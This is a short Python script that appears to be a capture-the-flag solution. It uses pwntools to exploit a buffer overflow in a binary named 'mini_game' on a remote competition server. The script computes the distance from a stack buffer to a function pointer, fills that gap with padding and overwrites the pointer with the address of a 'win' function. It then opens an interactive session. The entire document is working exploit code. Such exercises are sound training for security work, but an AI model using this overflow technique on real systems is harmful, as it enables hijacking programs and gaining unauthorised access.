from pwn import *

exe = ELF("./mini_game")
#p = exe.process()

p = remote("offsec.m0lecon.it", 13524)
win_addr = 0x004011fb
func_addr = 0x7fffffffde18
buf_addr = 0x7fffffffddd0
offset = func_addr - buf_addr
#print(f"Offset: {offset:#x}")
payload = b"A" * offset
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
